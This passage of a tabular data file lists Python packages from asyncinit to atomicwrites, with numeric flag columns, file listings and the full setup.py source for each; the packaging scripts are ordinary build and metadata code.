    name=""asyncinit"",
    version=""0.2.4"",
    description=""Class decorator to enable async __init__"",
    author=""Mick Koch"",
    license=""MIT"",
    author_email=""mick@kochm.co"",
    url=""https://github.com/kchmck/pyasyncinit"",
    packages=[""asyncinit""],
    python_requires="">=3.5"",
    extras_require={
        ""dev"": [
            ""pylint~=2.1"",
            ""pytest~=3.6"",
        ],
    },
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""License :: OSI Approved :: MIT License"",
    ],
    keywords=""async init asyncio"",
)
",1
asyncio-3.4.3,1,1,1,1,0,0,0,0,base_events.py base_subprocess.py constants.py coroutines.py events.py futures.py locks.py log.py proactor_events.py protocols.py queues.py selectors.py selector_events.py sslproto.py streams.py subprocess.py tasks.py test_support.py test_utils.py transports.py unix_events.py windows_events.py windows_utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt AUTHORS check.py COPYING cacheclt.py cachesvr.py child_process.py crawl.py echo_client_tulip.py echo_server_tulip.py fetch0.py fetch1.py fetch2.py fetch3.py fuzz_as_completed.py hello_callback.py hello_coroutine.py shell.py simple_tcp_server.py sink.py source.py source1.py stacks.py subprocess_attach_read_pipe.py subprocess_attach_write_pipe.py subprocess_shell.py tcp_echo.py timing_tcp_server.py udp_echo.py Makefile MANIFEST.in overlapped.c PKG-INFO pypi.bat README release.py runtests.py run_aiotest.py setup.cfg setup.py echo.py echo2.py echo3.py keycert3.pem pycacert.pem sample.crt sample.key ssl_cert.pem ssl_key.pem test_base_events.py test_events.py test_futures.py test_locks.py test_proactor_events.py test_queues.py test_selectors.py test_selector_events.py test_sslproto.py test_streams.py test_subprocess.py test_tasks.py test_transports.py test_unix_events.py test_windows_events.py test_windows_utils.py update_stdlib.sh,"# Release procedure:
#  - run tox (to run runtests.py and run_aiotest.py)
#  - maybe test examples
#  - update version in setup.py
#  - hg ci
#  - hg tag VERSION
#  - hg push
#  - run on Linux: python setup.py register sdist upload
#  - run on Windows: python release.py VERSION
#  - increment version in setup.py
#  - hg ci && hg push

import os
try:
    from setuptools import setup, Extension
except ImportError:
    # Use distutils.core as a fallback.
    # We won't be able to build the Wheel file on Windows.
    from distutils.core import setup, Extension

extensions = []
if os.name == 'nt':
    ext = Extension(
        'asyncio._overlapped', ['overlapped.c'], libraries=['ws2_32'],
    )
    extensions.append(ext)

with open(""README"") as fp:
    long_description = fp.read()

setup(
    name=""asyncio"",
    version=""3.4.3"",

    description=""reference implementation of PEP 3156"",
    long_description=long_description,
    url=""http://www.python.org/dev/peps/pep-3156/"",

    classifiers=[
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.3"",
    ],

    packages=[""asyncio""],
    test_suite=""runtests.runtests"",

    ext_modules=extensions,
)
",1
asyncio-nats-client-0.11.5,0,1,1,1,1,0,0,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe LICENSE client.py errors.py nuid.py utils.py __init__.py parser.py __init__.py __init__.py PKG-INFO setup.cfg setup.py,"from setuptools import setup
from nats.aio.client import __version__

EXTRAS = {
    'nkeys': ['nkeys'],
}

setup(
    name='asyncio-nats-client',
    version=__version__,
    description='NATS client for Python Asyncio',
    long_description='Asyncio based Python client for NATS, a lightweight, high-performance cloud native messaging system',
    classifiers=[
        'Intended Audience :: Developers',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8'
        ],
    url='https://github.com/nats-io/nats.py',
    author='Waldemar Quevedo',
    author_email='wally@synadia.com',
    license='Apache 2 License',
    packages=['nats', 'nats.aio', 'nats.protocol'],
    zip_safe=True,
    extras_require=EXTRAS
)
",1
asyncio-throttle-1.0.2,0,1,1,1,1,0,0,0,throttler.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py,"import os
from setuptools import setup

here = os.path.abspath(os.path.dirname(__file__))

with open(os.path.join(here, ""README.md"")) as f:
    long_description = f.read()

setup(
    name=""asyncio-throttle"",
    version=""1.0.2"",
    url=""https://github.com/hallazzang/asyncio-throttle"",
    license=""MIT"",
    author=""Hanjun Kim"",
    author_email=""hallazzang@gmail.com"",
    description=""Simple, easy-to-use throttler for asyncio"",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    packages=[""asyncio_throttle""],
    package_data={""asyncio_throttle"": [""py.typed""]},
    include_package_data=True,
    python_requires="">=3.6"",
    platforms=""any"",
    classifiers=[
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ],
)
",0
asyncmock-0.4.2,0,1,1,1,1,0,0,0,__init__.py __version__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.rst setup.cfg setup.py,"from pathlib import Path
from setuptools import setup


here = Path(__file__).parent

about = {}
with (here / ""asyncmock/__version__.py"").open() as f:
    exec(f.read(), about)

setup(version=about[""__version__""])
",1
asyncpg-0.26.0,0,1,1,1,1,0,1,0,.flake8 cluster.py compat.py connection.py connect_utils.py connresource.py cursor.py _base.py __init__.py introspection.py buffer.pxd buffer.pyx bits.pyx bytea.pyx context.pyx datetime.pyx float.pyx geometry.pyx hstore.pyx int.pyx json.pyx jsonpath.pyx misc.pyx network.pyx numeric.pyx pg_snapshot.pyx text.pyx tid.pyx uuid.pyx __init__.pxd consts.pxi cpythonx.pxd debug.h debug.pxd frb.pxd frb.pyx hton.h hton.pxd pgproto.c pgproto.pxd pgproto.pyx tohex.h tohex.pxd types.py uuid.pyx __init__.pxd __init__.py pool.py prepared_stmt.py array.pyx base.pxd base.pyx pgproto.pyx range.pyx record.pyx textutils.pyx __init__.py consts.pxi coreproto.pxd coreproto.pyx cpythonx.pxd encodings.pyx pgtypes.pxi prepared_stmt.pxd prepared_stmt.pyx protocol.c protocol.pxd protocol.pyx recordobj.c recordobj.h __init__.pxd scram.pxd scram.pyx settings.pxd settings.pyx __init__.py serverversion.py transaction.py types.py utils.py fuzzer.py __init__.py _version.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS index.rst conf.py faq.rst index.rst installation.rst Makefile usage.rst theme_overrides.css LICENSE Makefile MANIFEST.in performance.png PKG-INFO pyproject.toml README.rst setup.cfg setup.py ca.cert.pem ca.crl.pem ca.key.pem client.cert.pem client.csr.pem client.key.pem client.key.protected.pem client_ca.cert.pem client_ca.key.pem gen.py server.cert.pem server.key.pem test_adversity.py test_cache_invalidation.py test_cancellation.py test_codecs.py test_connect.py test_copy.py test_cursor.py test_exceptions.py test_execute.py test_introspection.py test_listeners.py test_pool.py test_prepare.py test_record.py test_test.py test_timeout.py test_transaction.py test_types.py test_utils.py test__environment.py test__sourcecode.py __init__.py,"# Copyright (C) 2016-present the asyncpg authors and contributors
# <see AUTHORS file>
#
# This module is part of asyncpg and is released under
# the Apache 2.0 License: http://www.apache.org/licenses/LICENSE-2.0


import sys

if sys.version_info < (3, 6):
    raise RuntimeError('asyncpg requires Python 3.6 or greater')

import os
import os.path
import pathlib
import platform
import re
import subprocess

# We use vanilla build_ext, to avoid importing Cython via
# the setuptools version.
import setuptools
from setuptools.command import build_py as setuptools_build_py
from setuptools.command import sdist as setuptools_sdist
from setuptools.command import build_ext as setuptools_build_ext


CYTHON_DEPENDENCY = 'Cython(>=0.29.24,<0.30.0)'

# Minimal dependencies required to test asyncpg.
TEST_DEPENDENCIES = [
    # pycodestyle is a dependency of flake8, but it must be frozen because
    # their combination breaks too often
    # (example breakage: https://gitlab.com/pycqa/flake8/issues/427)
    'pycodestyle~=2.7.0',
    'flake8~=3.9.2',
    'uvloop>=0.15.3; platform_system != ""Windows"" and python_version >= ""3.7""',
]

# Dependencies required to build documentation.
DOC_DEPENDENCIES = [
    'Sphinx~=4.1.2',
    'sphinxcontrib-asyncio~=0.3.0',
    'sphinx_rtd_theme~=0.5.2',
]

EXTRA_DEPENDENCIES = {
    'docs': DOC_DEPENDENCIES,
    'test': TEST_DEPENDENCIES,
    # Dependencies required to develop asyncpg.
    'dev': [
        CYTHON_DEPENDENCY,
        'pytest>=6.0',
    ] + DOC_DEPENDENCIES + TEST_DEPENDENCIES
}


CFLAGS = ['-O2']
LDFLAGS = []

if platform.uname().system != 'Windows':
    CFLAGS.extend(['-fsigned-char', '-Wall', '-Wsign-compare', '-Wconversion'])


_ROOT = pathlib.Path(__file__).parent


with open(str(_ROOT / 'README.rst')) as f:
    readme = f.read()


with open(str(_ROOT / 'asyncpg' / '_version.py')) as f:
    for line in f:
        if line.startswith('__version__ ='):
            _, _, version = line.partition('=')
            VERSION = version.strip("" \n'\"""")
            break
    else:
        raise RuntimeError(
            'unable to read the version from asyncpg/_version.py')


if (_ROOT / '.git').is_dir() and 'dev' in VERSION:
    # This is a git checkout, use git to
    # generate a precise version.
    def git_commitish():
        env = {}
        v = os.environ.get('PATH')
        if v is not None:
            env['PATH'] = v

        git = subprocess.run(['git', 'rev-parse', 'HEAD'], env=env,
                             cwd=str(_ROOT), stdout=subprocess.PIPE)
        if git.returncode == 0:
            commitish = git.stdout.strip().decode('ascii')
        else:
            commitish = 'unknown'

        return commitish

    VERSION += '+' + git_commitish()[:7]


class VersionMixin:

    def _fix_version(self, filename):
        # Replace asyncpg.__version__ with the actual version
        # of the distribution (possibly inferred from git).

        with open(str(filename)) as f:
            content = f.read()

        version_re = r""(.*__version__\s*=\s*)'[^']+'(.*)""
        repl = r""\1'{}'\2"".format(self.distribution.metadata.version)
        content = re.sub(version_re, repl, content)

        with open(str(filename), 'w') as f:
            f.write(content)


class sdist(setuptools_sdist.sdist, VersionMixin):

    def make_release_tree(self, base_dir, files):
        super().make_release_tree(base_dir, files)
        self._fix_version(pathlib.Path(base_dir) / 'asyncpg' / '_version.py')


class build_py(setuptools_build_py.build_py, VersionMixin):

    def build_module(self, module, module_file, package):
        outfile, copied = super().build_module(module, module_file, package)

        if module == '__init__' and package == 'asyncpg':
            self._fix_version(outfile)

        return outfile, copied


class build_ext(setuptools_build_ext.build_ext):

    user_options = setuptools_build_ext.build_ext.user_options + [
        ('cython-always', None,
            'run cythonize() even if .c files are present'),
        ('cython-annotate', None,
            'Produce a colorized HTML version of the Cython source.'),
        ('cython-directives=', None,
            'Cython compiler directives'),
    ]

    def initialize_options(self):
        # initialize_options() may be called multiple times on the
        # same command object, so make sure not to override previously
        # set options.
        if getattr(self, '_initialized', False):
            return

        super(build_ext, self).initialize_options()

        if os.environ.get('ASYNCPG_DEBUG'):
            self.cython_always = True
            self.cython_annotate = True
            self.cython_directives = ""linetrace=True""
            self.define = 'PG_DEBUG,CYTHON_TRACE,CYTHON_TRACE_NOGIL'
            self.debug = True
        else:
            self.cython_always = False
            self.cython_annotate = None
            self.cython_directives = None

    def finalize_options(self):
        # finalize_options() may be called multiple times on the
        # same command object, so make sure not to override previously
        # set options.
        if getattr(self, '_initialized', False):
            return

        need_cythonize = self.cython_always
        cfiles = {}

        for extension in self.distribution.ext_modules:
            for i, sfile in enumerate(extension.sources):
                if sfile.endswith('.pyx'):
                    prefix, ext = os.path.splitext(sfile)
                    cfile = prefix + '.c'

                    if os.path.exists(cfile) and not self.cython_always:
                        extension.sources[i] = cfile
                    else:
                        if os.path.exists(cfile):
                            cfiles[cfile] = os.path.getmtime(cfile)
                        else:
                            cfiles[cfile] = 0
                        need_cythonize = True

        if need_cythonize:
            import pkg_resources

            # Double check Cython presence in case setup_requires
            # didn't go into effect (most likely because someone
            # imported Cython before setup_requires injected the
            # correct egg into sys.path.
            try:
                import Cython
            except ImportError:
                raise RuntimeError(
                    'please install {} to compile asyncpg from source'.format(
                        CYTHON_DEPENDENCY))

            cython_dep = pkg_resources.Requirement.parse(CYTHON_DEPENDENCY)
            if Cython.__version__ not in cython_dep:
                raise RuntimeError(
                    'asyncpg requires {}, got Cython=={}'.format(
                        CYTHON_DEPENDENCY, Cython.__version__
                    ))

            from Cython.Build import cythonize

            directives = {
                'language_level': '3',
            }

            if self.cython_directives:
                for directive in self.cython_directives.split(','):
                    k, _, v = directive.partition('=')
                    if v.lower() == 'false':
                        v = False
                    if v.lower() == 'true':
                        v = True

                    directives[k] = v

            self.distribution.ext_modules[:] = cythonize(
                self.distribution.ext_modules,
                compiler_directives=directives,
                annotate=self.cython_annotate)

        super(build_ext, self).finalize_options()


setup_requires = []

if (not (_ROOT / 'asyncpg' / 'protocol' / 'protocol.c').exists() or
        '--cython-always' in sys.argv):
    # No Cython output, require Cython to build.
    setup_requires.append(CYTHON_DEPENDENCY)


setuptools.setup(
    name='asyncpg',
    version=VERSION,
    description='An asyncio PostgreSQL driver',
    long_description=readme,
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Framework :: AsyncIO',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: POSIX',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: Microsoft :: Windows',
        'Programming Language :: Python :: 3 :: Only',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: Implementation :: CPython',
        'Topic :: Database :: Front-Ends',
    ],
    platforms=['macOS', 'POSIX', 'Windows'],
    python_requires='>=3.6.0',
    zip_safe=False,
    author='MagicStack Inc',
    author_email='hello@magic.io',
    url='https://github.com/MagicStack/asyncpg',
    license='Apache License, Version 2.0',
    packages=setuptools.find_packages(
        exclude=['tests', 'tools'],
    ),
    package_data={
        # Cython sources needed for tracebacks
        """": [""*.pyx"", ""*.pxd"", ""*.pxi""],
    },
    ext_modules=[
        setuptools.extension.Extension(
            ""asyncpg.pgproto.pgproto"",
            [""asyncpg/pgproto/pgproto.pyx""],
            extra_compile_args=CFLAGS,
            extra_link_args=LDFLAGS),

        setuptools.extension.Extension(
            ""asyncpg.protocol.protocol"",
            [""asyncpg/protocol/record/recordobj.c"",
             ""asyncpg/protocol/protocol.pyx""],
            include_dirs=['asyncpg/pgproto/'],
            extra_compile_args=CFLAGS,
            extra_link_args=LDFLAGS),
    ],
    install_requires=['typing-extensions>=3.7.4.3;python_version<""3.8""'],
    cmdclass={'build_ext': build_ext, 'build_py': build_py, 'sdist': sdist},
    test_suite='tests.suite',
    extras_require=EXTRA_DEPENDENCIES,
    setup_requires=setup_requires,
)
",0
asyncpool-1.0,0,1,1,1,0,0,1,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"from setuptools import setup
from setuptools.command.test import test as TestCommand
import os
import sys

py_version = sys.version_info[:2]

if py_version < (3, 3):
    raise Exception(""AsyncPool requires Python >= 3.3."")

long_description = """"""
AsyncPool is a asyncio-based coroutine worker pool, intended to process through large amounts of jobs
efficiently and with explicit timeouts.
""""""

setup(
    name='asyncpool',
    version='1.0',
    url='http://github.com/calidog/asyncpool/',
    author='Ryan Sears',
    author_email='ryan@calidog.io',
    description='Async coroutine worker pool',
    long_description=long_description,
    packages=['asyncpool'],
    include_package_data=True,
    license = ""MIT"",
    classifiers = [
        ""License :: OSI Approved :: MIT License"",
        ""Topic :: Internet :: WWW/HTTP"",
        ""Topic :: Software Development :: Testing"",
        ""Environment :: Console"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: POSIX"",
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)",1
asyncssh-2.12.0,0,1,1,1,0,0,1,0,.coveragerc run_tests.yml .gitignore agent.py agent_unix.py agent_win32.py asn1.py auth.py auth_keys.py channel.py client.py compression.py config.py connection.py constants.py chacha.py cipher.py dh.py dsa.py ec.py ec_params.py ed.py kdf.py misc.py rsa.py sntrup.py umac.py x509.py __init__.py dsa.py ecdsa.py eddsa.py editor.py encryption.py forward.py gss.py gss_unix.py gss_win32.py kex.py kex_dh.py kex_rsa.py keysign.py known_hosts.py listener.py logging.py mac.py misc.py packet.py pattern.py pbe.py pkcs11.py process.py public_key.py py.typed rsa.py saslprep.py scp.py server.py session.py sftp.py sk.py sk_ecdsa.py sk_eddsa.py socks.py stream.py subprocess.py version.py x11.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CONTRIBUTING.rst COPYRIGHT api.rst changes.rst conf.py contributing.rst index.rst layout.html rftheme.css_t theme.conf rtd-req.txt sidebarbottom.html sidebartop.html callback_client.py callback_client2.py callback_client3.py callback_math_server.py chat_server.py check_exit_status.py chroot_sftp_server.py direct_client.py direct_server.py editor.py gather_results.py listening_client.py local_forwarding_client.py local_forwarding_client2.py local_forwarding_server.py math_client.py math_server.py redirect_input.py redirect_local_pipe.py redirect_remote_pipe.py redirect_server.py remote_forwarding_client.py remote_forwarding_client2.py remote_forwarding_server.py reverse_client.py reverse_server.py scp_client.py set_environment.py set_terminal.py sftp_client.py show_environment.py show_terminal.py simple_cert_server.py simple_client.py simple_keyed_server.py simple_scp_server.py simple_server.py simple_sftp_server.py stream_direct_client.py stream_direct_server.py stream_listening_client.py LICENSE MANIFEST.in mypy.ini PKG-INFO pylintrc README.rst setup.cfg setup.py gssapi_stub.py gss_stub.py keysign_stub.py pkcs11_stub.py server.py sk_stub.py sspi_stub.py test_agent.py test_asn1.py test_auth.py test_auth_keys.py test_channel.py test_compression.py test_config.py test_connection.py test_connection_auth.py test_editor.py test_encryption.py test_forward.py test_kex.py test_known_hosts.py test_logging.py test_mac.py test_packet.py test_pkcs11.py test_process.py test_public_key.py test_saslprep.py test_sftp.py test_sk.py test_stream.py test_subprocess.py test_x11.py test_x509.py util.py __init__.py tox.ini,"#!/usr/bin/env python3.6

# Copyright (c) 2013-2022 by Ron Frederick <ronf@timeheart.net> and others.
#
# This program and the accompanying materials are made available under
# the terms of the Eclipse Public License v2.0 which accompanies this
# distribution and is available at:
#
#     http://www.eclipse.org/legal/epl-2.0/
#
# This program may also be made available under the following secondary
# licenses when the conditions for such availability set forth in the
# Eclipse Public License v2.0 are satisfied:
#
#    GNU General Public License, Version 2.0, or any later versions of
#    that license
#
# SPDX-License-Identifier: EPL-2.0 OR GPL-2.0-or-later
#
# Contributors:
#     Ron Frederick - initial implementation, API, and documentation

""""""AsyncSSH: Asynchronous SSHv2 client and server library

AsyncSSH is a Python package which provides an asynchronous client and
server implementation of the SSHv2 protocol on top of the Python asyncio
framework. It requires Python 3.6 or later and the PyCA library for some
cryptographic functions.

""""""

from os import path
from setuptools import setup

base_dir = path.abspath(path.dirname(__file__))

doclines = __doc__.split('\n', 1)

with open(path.join(base_dir, 'README.rst')) as desc:
    long_description = desc.read()

with open(path.join(base_dir, 'asyncssh', 'version.py')) as version:
    exec(version.read())

setup(name = 'asyncssh',
      version = __version__,
      author = __author__,
      author_email = __author_email__,
      url = __url__,
      project_urls = {
         'Documentation': 'https://asyncssh.readthedocs.io',
         'Source':        'https://github.com/ronf/asyncssh',
         'Tracker':       'https://github.com/ronf/asyncssh/issues'
      },
      license = 'Eclipse Public License v2.0',
      description = doclines[0],
      long_description = long_description,
      platforms = 'Any',
      python_requires = '>= 3.6',
      install_requires = ['cryptography >= 3.1', 'typing_extensions >= 3.6'],
      extras_require = {
          'bcrypt':     ['bcrypt >= 3.1.3'],
          'fido2':      ['fido2 >= 0.9.2'],
          'gssapi':     ['gssapi >= 1.2.0'],
          'libnacl':    ['libnacl >= 1.4.2'],
          'pkcs11':     ['python-pkcs11 >= 0.7.0'],
          'pyOpenSSL':  ['pyOpenSSL >= 17.0.0'],
          'pywin32':    ['pywin32 >= 227']
      },
      packages = ['asyncssh', 'asyncssh.crypto'],
      package_data = {'asyncssh': ['py.typed']},
      scripts = [],
      test_suite = 'tests',
      classifiers = [
          'Development Status :: 5 - Production/Stable',
          'Environment :: Console',
          'Intended Audience :: Developers',
          'License :: OSI Approved',
          'Operating System :: MacOS :: MacOS X',
          'Operating System :: POSIX',
          'Programming Language :: Python :: 3.6',
          'Programming Language :: Python :: 3.7',
          'Programming Language :: Python :: 3.8',
          'Programming Language :: Python :: 3.9',
          'Programming Language :: Python :: 3.10',
          'Topic :: Internet',
          'Topic :: Security :: Cryptography',
          'Topic :: Software Development :: Libraries :: Python Modules',
          'Topic :: System :: Networking'])
",1
asynctest-0.13.0,0,1,1,1,1,0,0,0,case.py helpers.py mock.py selector.py _fail_on.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe LICENSE.md MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_case.py test_helpers.py test_mock.py test_selector.py utils.py __init__.py,"# coding: utf-8
""""""
asynctest setup script.

We rely on setuptools >= 30.3.0 to read setup.cfg, but provide a minimal
support with distutils.
""""""

args = {
    ""name"": ""asynctest"",
    ""packages"": [""asynctest""],
}

if __name__ == ""__main__"":
    from setuptools import setup
    setup(**args)
",0
async_generator-1.10,0,1,1,1,1,0,1,0,.coveragerc _impl.py conftest.py test_async_generator.py test_util.py __init__.py _util.py _version.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CODE_OF_CONDUCT.md CONTRIBUTING.md make.bat Makefile conf.py history.rst index.rst reference.rst .gitkeep LICENSE LICENSE.APACHE2 LICENSE.MIT MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test-requirements.txt,"from pathlib import Path

from setuptools import setup, find_packages

exec(open(""async_generator/_version.py"", encoding=""utf-8"").read())

setup(
    name=""async_generator"",
    version=__version__,
    description=""Async generators and context managers for Python 3.5+"",
    # Just in case the cwd is not the root of the source tree, or python is
    # not set to use utf-8 by default:
    long_description=Path(__file__).with_name(""README.rst"").read_text('utf-8'),
    author=""Nathaniel J. Smith"",
    author_email=""njs@pobox.com"",
    license=""MIT -or- Apache License 2.0"",
    packages=find_packages(),
    url=""https://github.com/python-trio/async_generator"",
    python_requires="">=3.5"",
    keywords=[""async""],
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Framework :: AsyncIO"",
    ]
)
",1
atlassian-jwt-auth-15.0.0,0,1,1,1,1,0,0,0,build.yml codeql-analysis.yml .mailmap algorithms.py auth.py auth.py key.py verifier.py __init__.py decorators.py middleware.py __init__.py decorators.py __init__.py README.md requests.py __init__.py test_auth.py test_public_key_provider.py test_verifier.py __init__.py test_requests.py utils.py __init__.py __init__.py exceptions.py asap.py backend.py decorators.py test_decorators.py test_utils.py __init__.py utils.py __init__.py backend.py decorators.py middleware.py settings.py test_django.py urls.py views.py __init__.py __init__.py backend.py decorators.py test_flask.py __init__.py __init__.py backend.py middleware.py test_wsgi.py __init__.py __init__.py __init__.py key.py signer.py test_key.py test_private_key_provider.py test_public_key_provider.py test_signer.py test_signer_private_key_repo.py test_verifier.py utils.py __init__.py verifier.py __init__.py dependency_links.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS ChangeLog LICENSE PKG-INFO README.rst requirements.txt setup.cfg setup.py test-requirements.txt,"#!/usr/bin/env python
from setuptools import setup


setup(
    setup_requires=['pbr<=6.0.0', 'pytest-runner'],
    pbr=True,
    platforms=['any'],
    zip_safe=False,
)
",0
atlassian-python-api-3.26.0,1,1,1,1,1,0,0,0,bamboo.py base.py base.py users.py __init__.py branchRestrictions.py defaultReviewers.py diffstat.py issues.py pipelines.py pullRequests.py refs.py __init__.py projects.py __init__.py __init__.py base.py permissions.py __init__.py globalPermissions.py __init__.py __init__.py __init__.py __init__.py confluence.py crowd.py errors.py insight.py jira.py marketplace.py portfolio.py request_utils.py rest_client.py service_desk.py utils.py VERSION xray.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst requirements.txt setup.cfg setup.py mockup.py test_base.py test_bitbucket_cloud_oo.py test_bitbucket_server.py test_bitbucket_server_oo.py test_confluence_advanced_mode.py test_confluence_attach.py test_servicedesk.py __init__.py tox.ini,"import os
from setuptools import find_packages
from setuptools import setup

with open(os.path.join(""atlassian"", ""VERSION"")) as file:
    version = file.read().strip()

with open(""README.rst"") as file:
    long_description = file.read()

setup(
    name=""atlassian-python-api"",
    description=""Python Atlassian REST API Wrapper"",
    long_description=long_description,
    license=""Apache License 2.0"",
    version=version,
    download_url=""https://github.com/atlassian-api/atlassian-python-api"",
    author=""Matt Harasymczuk"",
    author_email=""matt@astrotech.io"",
    maintainer=""Gonchik Tsymzhitov"",
    maintainer_email=""gonchik.tsymzhitov@gmail.com"",
    url=""https://github.com/atlassian-api/atlassian-python-api"",
    keywords=""atlassian jira core software confluence bitbucket bamboo crowd portfolio tempo servicedesk rest api"",
    packages=find_packages(include=[""atlassian*""]),
    package_dir={""atlassian"": ""atlassian""},
    include_package_data=True,
    zip_safe=False,
    install_requires=[""deprecated"", ""requests"", ""six"", ""oauthlib"", ""requests_oauthlib""],
    extras_require={""kerberos"": ['requests-kerberos']},
    platforms=""Platform Independent"",
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Environment :: Web Environment"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: System Administrators"",
        ""Intended Audience :: Information Technology"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Natural Language :: English"",
        ""Operating System :: OS Independent"",
        ""Operating System :: POSIX"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: Microsoft :: Windows"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Topic :: Utilities"",
        ""Topic :: Internet"",
        ""Topic :: Internet :: WWW/HTTP"",
        ""Topic :: Internet :: WWW/HTTP :: Dynamic Content"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
        ""Topic :: Software Development :: Libraries :: Application Frameworks"",
    ],
)
",0
atomacos-3.3.0,1,1,1,1,1,0,0,0,.gitignore .pre-commit-config.yaml .travis.yml AXCallbacks.py AXClasses.py errors.py keyboard.py mouse.py _a11y.py _converter.py _macos.py _input.py _search.py _wait.py __init__.py _notification.py __init__.py CHANGELOG.md CONTRIBUTING.md conf.py contributing.md index.rst readme.rst LICENSE PKG-INFO pyproject.toml README.md build-docs-prod.sh config.sh deploy-prod.sh setup.cfg setup.py conftest.py test_atomacos.py test_input.py test_package_functions.py test_readme_examples.py test_search_methods.py test_uielement.py test_utils.py test_wait_for_methods.py tox.ini,"#!/usr/bin/env python
# setup.py generated by flit for tools that don't yet use PEP 517

from distutils.core import setup

packages = \
['atomacos', 'atomacos._mixin']

package_data = \
{'': ['*']}

install_requires = \
['pyobjc-core>=3.0.4',
 'pyobjc-framework-Cocoa>=3.0.4',
 'pyobjc-framework-Quartz>=3.0.4',
 'pyobjc-framework-ApplicationServices>=3.0.4',
 'pyobjc-framework-CoreText>=3.0.4',
 'pygetwindow<0.0.5',
 'pyscreeze<0.1.20',
 'pyautogui<0.9.42',
 'future']

extras_require = \
{'dev': ['black', 'pre-commit', 'tox'],
 'doc': ['sphinx', 'm2r2'],
 'test': ['pytest', 'pytest-cov']}

setup(name='atomacos',
      version='3.3.0',
      description='Automated Testing on macOS',
      author='Davee Nguyen',
      author_email='davee@daveenguyen.com',
      url='https://github.com/daveenguyen/atomacos',
      packages=packages,
      package_data=package_data,
      install_requires=install_requires,
      extras_require=extras_require,
     )
",1
atomicwrites-1.4.1,0,1,1,1,1,0,0,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt conf.py index.rst make.bat Makefile LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_atomicwrites.py,"# -*- coding: utf-8 -*-

import ast
import re

from setuptools import find_packages, setup


_version_re = re.compile(r'__version__\s+=\s+(.*)')


with open('atomicwrites/__init__.py', 'rb') as f:
    version = str(ast.literal_eval(_version_re.search(
        f.read().decode('utf-8')).group(1)))

setup(
    name='atomicwrites',
    version=version,
    author='Markus Unterwaditzer',
    author_email='markus@unterwaditzer.net',
    url='https://github.com/untitaker/python-atomicwrites',
    description='Atomic file writes.',
    license='MIT',
    long_description=open('README.rst').read(),
    packages=find_packages(exclude=['tests.*', 'tests']),
    include_package_data=True,
    classifiers=[
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
